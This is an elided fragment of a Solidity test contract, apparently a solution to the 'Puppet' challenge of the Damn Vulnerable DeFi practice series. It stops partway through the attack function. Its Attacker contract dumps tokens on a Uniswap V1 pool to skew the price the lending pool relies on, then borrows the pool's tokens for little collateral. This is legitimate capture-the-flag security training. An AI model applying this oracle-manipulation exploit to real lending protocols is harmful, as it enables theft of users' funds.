...
contract POC is Test {
   address deployer = makeAddr("deployer");
    ...
    function test_puppet() public checkSolvedByPlayer {
        attacker = new Attacker{value: 20 ether}(address(token), address(uniswapV1Exchange), address(lendingPool), player);
...
contract Attacker {
    ...
    constructor(address _token, address _uniswapV1Exchange, address _lendingPool, address _player) payable {
        token = DamnValuableToken(_token);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        lendingPool = PuppetPool(_lendingPool);
        player = _player;
        token.approve(address(this), PLAYER_INITIAL_TOKEN_BALANCE);
    }

    function attack(address recovery) public payable {
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 9, block.timestamp, address(this));

        lendingPool.borrow{value: 20 ether}(100000 ether, recovery);
